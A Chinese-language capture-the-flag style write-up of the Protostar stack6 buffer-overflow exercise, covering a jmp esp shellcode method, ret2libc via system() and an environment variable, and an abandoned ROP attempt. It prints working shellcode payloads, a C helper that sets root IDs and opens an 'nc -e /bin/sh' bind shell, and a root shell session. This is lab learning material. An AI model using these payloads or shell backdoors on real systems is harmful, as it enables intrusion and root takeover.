## protostar-stack6

直接覆盖栈上数据

## http://exploit-exercises.com/protostar/stack6



## 1.创建pattern文件判断返回地址位置。

```
gdb /opt/protostar/bin/stack6
python -c 'print ("\x41" * 76) + "\xcc\xcc\xcc\xcc" +("\x90" * 16)+("\x42" *120)'>/tmp/patt  

python -c 'print ("\x41" * 80) + "\xcc\xcc\xcc\xcc" +("\x90" * 16)+("\x42" *120)'>/tmp/patt1 

python -c 'print ("\x41" * 80)+ "\xc0\xfc\xff\xbf" +("\x90" * 16)+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+ ("\x90" * 50)' >/tmp/stack6

python -c 'print ("\x41" * 80)+ "\xc0\xfc\xff\xbf" +("\x90" *76)'>/tmp/stack6
```

## 2.对ret地址有限制

```
ret = __builtin_return_address(0);
16
17  if((ret & 0xbf000000) == 0xbf000000) {
18    printf("bzzzt (%p)\n", ret);
19    _exit(1);
20  }
```
## 3.ret2libc||format||rop

## 3.1 jmp esp
```
(python -c "print 'A'*80 + '\x1d\x9a\xe9\xb7' + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'";cat )| /opt/protostar/bin/stack6
```

## 3.1 ret2libc
top

```
gdb /opt/protostar/bin/stack6
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) p system
No symbol "system" in current context.
(gdb) set args ssssssssssssssssss
(gdb) r
Starting program: /opt/protostar/bin/stack6 ssssssssssssssssss
input path please: ssssssssssssssssssssssssssssss^C
Program received signal SIGINT, Interrupt.
0xb7f53c1e in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
82      ../sysdeps/unix/syscall-template.S: No such file or directory.
        in ../sysdeps/unix/syscall-template.S
Current language:  auto
The current source language is "auto; currently asm".
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>----------------------->we need
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>-------------------------->we need
```

我们要使用ret2libc

Q:为什么参数在减8bytes处。
A:参照refs文档说明。

Q:WIN-NT下也是如此么
A:扩展阅读
https://www.corelan.be/index.php/category/security/exploit-writing-tutorials
'pop pop ret' trick etc

所以我们构思的栈内存构造如下：
[aaaaaaaaaaaaaaa...][system call address][exit call address][system args][exit args]

Q:我们如何找到system-call的参数呢
A:1.上面的aaaaa里面填。2.系统环境变量。3.其他

我们使用环境变量
way1:
```
// Prints the approximate address of an environmental variable
#include <stdio.h>
#include <stdlib.h>
 
int main(int argc, char **argv) {
    char *addr = getenv(argv[1]);
    if (addr == NULL) {
        printf("%s not found\n", argv[1]);
        return 1;
    }
    else {
        printf("%s is at address %p\n", argv[1], getenv(argv[1]));
    }
}
```
export ASDF="/bin/sh"

way2:
```
#!/bin/bash
if [[ $# -lt 2 ]]; then
    echo "usage: $0 OFFSET ADDRESS. Example: $0 80 0xdeadbeef 0xf00f00f0"
    exit 1
fi

perl -e "print 'A'x$1"
shift
for addr in $@; do
    for i in $(seq 8 -2 2); do echo -ne "\x${addr:$i:2}"; done
done
```

way3:
```
// Prints the approximate address of an environmental variable
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    char *addr = getenv(argv[1]);
    if (addr == NULL) {
        printf("%s not found\n", argv[1]);
        return 1;
    }
    else {
        printf("%s is at address %p\n", argv[1], getenv(argv[1]));
    }
}
```

way4:

```
getenv.c:
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
printf("\n%p\n\n", getenv("AAA"));
return(0);
}
```

都比较麻烦，调试器好用！

```
export AAA="/bin/sh"
(gdb) x/1000s $esp
...

0xbfffff86:      ""
0xbfffff87:      ""
0xbfffff88:      "/opt/protostar/bin/stack6"
0xbfffffa2:      "SHLVL=1"
0xbfffffaa:      "_=/usr/bin/gdb"
0xbfffffb9:      "COLUMNS=80"
0xbfffffc4:      "AAA=/bin/sh"
0xbfffffd0:      "PWD=/tmp"
0xbfffffd9:      "LINES=31"
0xbfffffe2:      "/opt/protostar/bin/stack6"
...
(gdb) x/s 0xbfffffc4
0xbfffffc4:      "AAA=/bin/sh"
(gdb) x/s 0xbfffffc8
0xbfffffc8:      "/bin/sh"

```

python -c "print 'A'*80 + '\xb0\xff\xec\xb7' + '\x54\xe1\xf2\xb7' +'\xc8\xff\xff\xbf' "|/opt/protostar/bin/stack6

但没有反弹shell。奇怪啊。(掉权限问题。很奇怪)

python -c "print 'A'*80 + '\xb0\xff\xec\xb7' + '\x54\xe1\xf2\xb7' +'\xc8\xff\xff\xbf' " >/tmp/ss1

/opt/protostar/bin/stack6

再次失败。

export AAA="nc -lp8080 -e/bin/sh"
不OK。

python -c "print 'A'*80 + '\xb0\xff\xec\xb7' + '\x54\xe1\xf2\xb7' +'\xbc\xff\xff\xbf' " |/opt/protostar/bin/stack6

protostar的gcc环境貌似有问题。我们别处编译个nc的反弹程序SCP上来
```
#include <stdlib.h>

int main(int argc, char **argv, char **envp) {
    setuid(0); // These two are necessary, as system() drops privileges
    setgid(0);
    char *args[] = {  "nc", "-lp8080", "-e/bin/sh", (char *) 0 };
    execve("/bin/nc", args, envp);
}
```

```
$export AAA=/////////////////////////////////////tmp/netc

$./getenv

0xbfffffbc

$python -c "print 'A'*80 + '\xb0\xff\xec\xb7' + '\x54\xe1\xf2\xb7' +'\xbc\xff\xff\xbf' " |/opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA°ÿì·AAAAAAAAAAAA°ÿì·Táò·¼ÿÿ¿
sh: ////////////////////tmp/netc: Permission denied
$chmod 777 /tmp/netc
$python -c "print 'A'*80 + '\xb0\xff\xec\xb7' + '\x54\xe1\xf2\xb7' +'\xbc\xff\xff\xbf' " |/opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA°ÿì·AAAAAAAAAAAA°ÿì·Táò·¼ÿÿ¿
```

```
D:\>nc 192.168.48.128 8080
id
uid=0(root) gid=0(root) groups=0(root),1001(user)
ps
  PID TTY          TIME CMD
 3985 pts/0    00:00:00 sh
 4000 pts/0    00:00:00 cat
 4376 pts/0    00:00:00 stack6
 4377 pts/0    00:00:00 sh
 4378 pts/0    00:00:00 sh
 4380 pts/0    00:00:00 ps
whoami
root
```


it works!

## 3.2 format

printf + execl + fmt + pwn + pwn 


## 3.3 rop

查找ROP指令：

user@protostar:/tmp/rapid7-metasploit-framework-c220a80$ ruby ./msfelfscan -p /opt/protostar/bin/stack6
[/opt/protostar/bin/stack6]

0x08048452 pop ebx; pop ebp; ret
0x08048577 pop edi; pop ebp; ret
0x080485a7 pop ebx; pop ebp; ret


user@protostar:/tmp/rapid7-metasploit-framework-c220a80$ ruby ./msfelfscan -j eax  /opt/protostar/bin/stack6
[/opt/protostar/bin/stack6]
0x0804847f call eax
0x0804859b call eax

cd /tmp
git clone git://github.com/JonathanSalwan/ROPgadget.git
cd ./ROPgadget
make
sudo make install

output error:no python2


我们换个ROP生成器。
https://github.com/0vercl0k/rp

user@protostar:/tmp$ ./rp-lin-x86 --file=/opt/protostar/bin/stack6 --rop=8 --unique
Trying to open '/opt/protostar/bin/stack6'..
Loading ELF information..
FileFormat: Elf, Arch: Ia32
Using the Nasm syntax..

Wait a few seconds, rp++ is looking for gadgets..
in PHDR
0 found.

in LOAD
163 found.

in STACK
0 found.

A total of 163 gadgets found.
You decided to keep only the unique ones, 134 unique gadgets found.
0x0804847b: adc al, 0x96 ; add al, 0x08 ; call eax ;  (1 found)
0x08048552: adc byte [ecx-0x74F7DBBC], cl ; inc ebp ; or al, 0x89 ; inc esp ; and al, 0x04 ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048590: adc edi, dword [ebx+0x08049604] ; nop  ; sub ebx, 0x04 ; call eax ;  (1 found)
0x0804836a: add al, 0x08 ; add byte [eax], al ; add byte [eax], al ; jmp dword [0x080496F8] ;  (1 found)
0x0804844c: add al, 0x08 ; add dword [ebx+0x5D5B04C4], eax ; ret  ;  (1 found)
0x08048436: add al, 0x08 ; call dword [0x0804960C+eax*4] ;  (1 found)
0x0804847d: add al, 0x08 ; call eax ;  (1 found)
0x08048364: add al, 0x08 ; jmp dword [0x080496F4] ;  (1 found)
0x08048594: add al, 0x08 ; nop  ; sub ebx, 0x04 ; call eax ;  (1 found)
0x08048479: add al, 0x24 ; adc al, 0x96 ; add al, 0x08 ; call eax ;  (1 found)
0x08048562: add al, 0x24 ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048451: add al, 0x5B ; pop ebp ; ret  ;  (2 found)
0x08048592: add al, 0x96 ; add al, 0x08 ; nop  ; sub ebx, 0x04 ; call eax ;  (1 found)
0x08048359: add al, byte [eax] ; add byte [eax+0x5B], bl ; leave  ; ret  ;  (1 found)
0x08048549: add al, byte [ebp+0x312474FF] ; test byte [ebx+0x44891045], 0x00000024 ; or byte [ebx+0x44890C45], cl ; and al, 0x04 ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048356: add al, ch ; and al, 0x02 ; add byte [eax], al ; pop eax ; pop ebx ; leave  ; ret  ;  (1 found)
0x0804835b: add byte [eax+0x5B], bl ; leave  ; ret  ;  (1 found)
0x0804842c: add byte [eax], al ; add byte [eax], al ; add eax, 0x01 ; mov dword [0x08049728], eax ; call dword [0x0804960C+eax*4] ;  (1 found)
0x0804836c: add byte [eax], al ; add byte [eax], al ; jmp dword [0x080496F8] ;  (1 found)
0x08048471: add byte [eax], al ; add byte [ebp-0x38F68B40], al ; add al, 0x24 ; adc al, 0x96 ; add al, 0x08 ; call eax ;  (1 found)
0x0804842d: add byte [eax], al ; add byte [ebx+0x28A301C0], al ; xchg eax, edi ; add al, 0x08 ; call dword [0x0804960C+eax*4] ;  (1 found)
0x08048339: add byte [eax], al ; add byte [ebx-0x7F], bl ; ret  ;  (2 found)
0x0804842e: add byte [eax], al ; add eax, 0x01 ; mov dword [0x08049728], eax ; call dword [0x0804960C+eax*4] ;  (1 found)
0x0804836e: add byte [eax], al ; jmp dword [0x080496F8] ;  (1 found)
0x0804835a: add byte [eax], al ; pop eax ; pop ebx ; leave  ; ret  ;  (1 found)
0x08048473: add byte [ebp-0x38F68B40], al ; add al, 0x24 ; adc al, 0x96 ; add al, 0x08 ; call eax ;  (1 found)
0x0804842f: add byte [ebx+0x28A301C0], al ; xchg eax, edi ; add al, 0x08 ; call dword [0x0804960C+eax*4] ;  (1 found)
0x0804833b: add byte [ebx-0x7F], bl ; ret  ;  (2 found)
0x08048354: add dword [eax], eax ; add al, ch ; and al, 0x02 ; add byte [eax], al ; pop eax ; pop ebx ; leave  ; ret  ;  (1 found)
0x08048432: add dword [ebx+0x08049728], esp ; call dword [0x0804960C+eax*4] ;  (1 found)
0x0804844e: add dword [ebx+0x5D5B04C4], eax ; ret  ;  (1 found)
0x08048425: add dword [ecx], edi ; fdiv dword [ebx+0x1E] ; lea esi, dword [esi+0x00000000] ; add eax, 0x01 ; mov dword [0x08049728], eax ; call dword [0x0804960C+eax*4] ;  (1 found)
0x08048430: add eax, 0x01 ; mov dword [0x08049728], eax ; call dword [0x0804960C+eax*4] ;  (1 found)
0x08048449: add eax, 0x08049724 ; add dword [ebx+0x5D5B04C4], eax ; ret  ;  (1 found)
0x0804859e: add eax, dword [ebx-0x0B8A0008] ; add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
0x0804844f: add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (2 found)
0x08048572: add esp, 0x1C ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
0x08048358: and al, 0x02 ; add byte [eax], al ; pop eax ; pop ebx ; leave  ; ret  ;  (1 found)
0x0804855c: and al, 0x04 ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048555: and al, 0x08 ; mov eax, dword [ebp+0x0C] ; mov dword [esp+0x04], eax ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x0804847a: and al, 0x14 ; xchg eax, esi ; add al, 0x08 ; call eax ;  (1 found)
0x0804854d: and al, 0x31 ; test byte [ebx+0x44891045], 0x00000024 ; or byte [ebx+0x44890C45], cl ; and al, 0x04 ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x0804844a: and al, 0x97 ; add al, 0x08 ; add dword [ebx+0x5D5B04C4], eax ; ret  ;  (1 found)
0x080484f2: and al, 0xE8 ; enter 0xFFFE, 0xFF ; leave  ; ret  ;  (1 found)
0x08048367: and eax, 0x080496F4 ; add byte [eax], al ; add byte [eax], al ; jmp dword [0x080496F8] ;  (1 found)
0x08048438: call dword [0x0804960C+eax*4] ;  (1 found)
0x08048564: call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x0804847f: call eax ;  (2 found)
0x080485a0: clc  ; push dword [ebp-0x0C] ; add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
0x0804858d: clc  ; push dword [ebx+edx-0x45] ; add al, 0x96 ; add al, 0x08 ; nop  ; sub ebx, 0x04 ; call eax ;  (1 found)
0x080484f7: dec ecx ; ret  ;  (1 found)
0x080484f4: enter 0xFFFE, 0xFF ; leave  ; ret  ;  (1 found)
0x08048427: fdiv dword [ebx+0x1E] ; lea esi, dword [esi+0x00000000] ; add eax, 0x01 ; mov dword [0x08049728], eax ; call dword [0x0804960C+eax*4] ;  (1 found)
0x08048445: fdiv dword [edx-0x18] ; mov byte [0x08049724], 0x00000001 ; add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
0x08048571: fiadd word [ebx+0x5E5B1CC4] ; pop edi ; pop ebp ; ret  ;  (1 found)
0x080485a3: hlt  ; add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
0x08048368: hlt  ; xchg eax, esi ; add al, 0x08 ; add byte [eax], al ; add byte [eax], al ; jmp dword [0x080496F8] ;  (1 found)
0x08048506: in al, dx ; pop ebp ; ret  ;  (1 found)
0x08048512: in eax, 0x5D ; ret  ;  (1 found)
0x08048551: inc ebp ; adc byte [ecx-0x74F7DBBC], cl ; inc ebp ; or al, 0x89 ; inc esp ; and al, 0x04 ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048558: inc ebp ; or al, 0x89 ; inc esp ; and al, 0x04 ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x0804855b: inc esp ; and al, 0x04 ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048554: inc esp ; and al, 0x08 ; mov eax, dword [ebp+0x0C] ; mov dword [esp+0x04], eax ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048366: jmp dword [0x080496F4] ;  (1 found)
0x08048370: jmp dword [0x080496F8] ;  (1 found)
0x08048380: jmp dword [0x080496FC] ;  (1 found)
0x08048390: jmp dword [0x08049700] ;  (1 found)
0x080483a0: jmp dword [0x08049704] ;  (1 found)
0x080483b0: jmp dword [0x08049708] ;  (1 found)
0x080483c0: jmp dword [0x0804970C] ;  (1 found)
0x08048496: jmp dword [ecx+0x08049720] ;  (1 found)
0x0804842a: lea esi, dword [esi+0x00000000] ; add eax, 0x01 ; mov dword [0x08049728], eax ; call dword [0x0804960C+eax*4] ;  (1 found)
0x0804835e: leave  ; ret  ;  (4 found)
0x08048450: les eax,  [ebx+ebx*2] ; pop ebp ; ret  ;  (2 found)
0x08048573: les ebx,  [ebx+ebx*2] ; pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
0x08048448: mov byte [0x08049724], 0x00000001 ; add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
0x0804842b: mov dh, 0x00 ; add byte [eax], al ; add byte [ebx+0x28A301C0], al ; xchg eax, edi ; add al, 0x08 ; call dword [0x0804960C+eax*4] ;  (1 found)
0x08048433: mov dword [0x08049728], eax ; call dword [0x0804960C+eax*4] ;  (1 found)
0x0804855a: mov dword [esp+0x04], eax ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048553: mov dword [esp+0x08], eax ; mov eax, dword [ebp+0x0C] ; mov dword [esp+0x04], eax ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048478: mov dword [esp], 0x08049614 ; call eax ;  (1 found)
0x08048561: mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x0804855e: mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048557: mov eax, dword [ebp+0x0C] ; mov dword [esp+0x04], eax ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048550: mov eax, dword [ebp+0x10] ; mov dword [esp+0x08], eax ; mov eax, dword [ebp+0x0C] ; mov dword [esp+0x04], eax ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048511: mov ebp, esp ; pop ebp ; ret  ;  (1 found)
0x08048591: mov ebx, 0x08049604 ; nop  ; sub ebx, 0x04 ; call eax ;  (1 found)
0x0804857a: mov ebx, dword [esp] ; ret  ;  (1 found)
0x08048505: mov esp, ebp ; pop ebp ; ret  ;  (1 found)
0x0804850b: nop  ; nop  ; nop  ; nop  ; nop  ; push ebp ; mov ebp, esp ; pop ebp ; ret  ;  (1 found)
0x0804850c: nop  ; nop  ; nop  ; nop  ; push ebp ; mov ebp, esp ; pop ebp ; ret  ;  (1 found)
0x0804850d: nop  ; nop  ; nop  ; push ebp ; mov ebp, esp ; pop ebp ; ret  ;  (1 found)
0x0804850e: nop  ; nop  ; push ebp ; mov ebp, esp ; pop ebp ; ret  ;  (1 found)
0x0804850f: nop  ; push ebp ; mov ebp, esp ; pop ebp ; ret  ;  (1 found)
0x08048597: nop  ; sub ebx, 0x04 ; call eax ;  (2 found)
0x08048559: or al, 0x89 ; inc esp ; and al, 0x04 ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048365: or bh, bh ; and eax, 0x080496F4 ; add byte [eax], al ; add byte [eax], al ; jmp dword [0x080496F8] ;  (1 found)
0x0804847e: or bh, bh ; ror cl, 1  ; ret  ;  (1 found)
0x0804858b: or byte [ebx+0x1374FFF8], al ; mov ebx, 0x08049604 ; nop  ; sub ebx, 0x04 ; call eax ;  (1 found)
0x08048556: or byte [ebx+0x44890C45], cl ; and al, 0x04 ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x0804844d: or byte [ecx], al ; add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
0x08048443: or byte [ecx], bh ; fdiv dword [edx-0x18] ; mov byte [0x08049724], 0x00000001 ; add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
0x08048595: or byte [esi-0x70], ah ; sub ebx, 0x04 ; call eax ;  (1 found)
0x08048477: or edi, eax ; add al, 0x24 ; adc al, 0x96 ; add al, 0x08 ; call eax ;  (1 found)
0x0804835c: pop eax ; pop ebx ; leave  ; ret  ;  (1 found)
0x08048453: pop ebp ; ret  ;  (5 found)
0x0804835d: pop ebx ; leave  ; ret  ;  (2 found)
0x08048452: pop ebx ; pop ebp ; ret  ;  (2 found)
0x08048575: pop ebx ; pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
0x080485c4: pop ecx ; pop ebx ; leave  ; ret  ;  (1 found)
0x08048577: pop edi ; pop ebp ; ret  ;  (1 found)
0x08048576: pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
0x08048429: push ds ; lea esi, dword [esi+0x00000000] ; add eax, 0x01 ; mov dword [0x08049728], eax ; call dword [0x0804960C+eax*4] ;  (1 found)
0x08048360: push dword [0x080496F0] ; jmp dword [0x080496F4] ;  (1 found)
0x080485a1: push dword [ebp-0x0C] ; add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
0x0804858e: push dword [ebx+edx-0x45] ; add al, 0x96 ; add al, 0x08 ; nop  ; sub ebx, 0x04 ; call eax ;  (1 found)
0x0804854b: push dword [esp+0x31] ; test byte [ebx+0x44891045], 0x00000024 ; or byte [ebx+0x44890C45], cl ; and al, 0x04 ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x08048510: push ebp ; mov ebp, esp ; pop ebp ; ret  ;  (1 found)
0x0804833e: ret  ;  (13 found)
0x08048480: ror cl, 1  ; ret  ;  (1 found)
0x08048475: sal byte [ecx+ecx-0x39], 0x00000004 ; and al, 0x14 ; xchg eax, esi ; add al, 0x08 ; call eax ;  (1 found)
0x0804846c: sal byte [edx+edx-0x48], 0x00000000 ; add byte [eax], al ; add byte [ebp-0x38F68B40], al ; add al, 0x24 ; adc al, 0x96 ; add al, 0x08 ; call eax ;  (1 found)
0x0804857b: sbb al, 0x24 ; ret  ;  (1 found)
0x08048574: sbb al, 0x5B ; pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
0x08048598: sub ebx, 0x04 ; call eax ;  (1 found)
0x0804854f: test byte [ebx+0x44891045], 0x00000024 ; or byte [ebx+0x44890C45], cl ; and al, 0x04 ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)
0x0804844b: xchg eax, edi ; add al, 0x08 ; add dword [ebx+0x5D5B04C4], eax ; ret  ;  (1 found)
0x08048435: xchg eax, edi ; add al, 0x08 ; call dword [0x0804960C+eax*4] ;  (1 found)
0x08048369: xchg eax, esi ; add al, 0x08 ; add byte [eax], al ; add byte [eax], al ; jmp dword [0x080496F8] ;  (1 found)
0x0804847c: xchg eax, esi ; add al, 0x08 ; call eax ;  (1 found)
0x08048362: xchg eax, esi ; add al, 0x08 ; jmp dword [0x080496F4] ;  (2 found)
0x08048593: xchg eax, esi ; add al, 0x08 ; nop  ; sub ebx, 0x04 ; call eax ;  (1 found)
0x08048361: xor eax, 0x080496F0 ; jmp dword [0x080496F4] ;  (1 found)
0x0804854e: xor esi, esi ; mov eax, dword [ebp+0x10] ; mov dword [esp+0x08], eax ; mov eax, dword [ebp+0x0C] ; mov dword [esp+0x04], eax ; mov eax, dword [ebp+0x08] ; mov dword [esp], eax ; call dword [ebx+esi*4-0x000000E8] ;  (1 found)

我们的目标是执行
execve(”/bin/sh”, 0, 0) 
 
需要
eax = 0xb // execve
ebx = address of “/bin/sh”
ecx = 0 // argv
edx = 0 // env

找到1个可以勉强修改edx的指令：
···
0xb7ff9764 <memcpy+52>: mov    %edx,%ecx
0xb7ff9766 <memcpy+54>: cld
0xb7ff9767 <memcpy+55>: rep movsb %ds:(%esi),%es:(%edi)
0xb7ff9769 <memcpy+57>: mov    (%esp),%esi
---Type <return> to continue, or q <return> to quit---
0xb7ff976c <memcpy+60>: mov    0x4(%esp),%edi
0xb7ff9770 <memcpy+64>: mov    %ebp,%esp
0xb7ff9772 <memcpy+66>: pop    %ebp
0xb7ff9773 <memcpy+67>: ret
···

···
0x080485c4: pop ecx ; pop ebx ; leave  ; ret  ;  (1 found)------>ecx=0
'\xc4\x85\x04\x08'+'\x00\x00\x00\x00'+'a'*4
0x0804835c: pop eax ; pop ebx ; leave  ; ret  ;  (1 found)------>eax=0xb 
'\x5c\x83\x04\x08'+'\x0b\x00\x00\x00'+'b'*4
···

leave指令后返回ebp。这里ebp可以被我们控制。但栈地址不固定。

push 0x68732f2f   ; /bin//sh
push 0x6e69622f
mov ebx, esp


echo $(python -c 'print ("a"*80)+ "\x1d\x9a\xe9\xb7"+"\xc4\x85\x04\x08"+"\x00\x00\x00\x00"+("a"*4)+"\x5c\x83\x04\x08"+"\x0b\x00\x00\x00"+("b"*4)')$(cat /tmp/ss)| /opt/protostar/bin/stack6

思路：
jmp esp +ROP版本的 EAX,ECX改变+ASM版本的( move ebx "/bin/sh"+call syscall)

考虑到这里ROP指令不足，只能成功修改eax,ecx,且都含leave指令。
最终放弃ROP做法。jmp esp rocks。



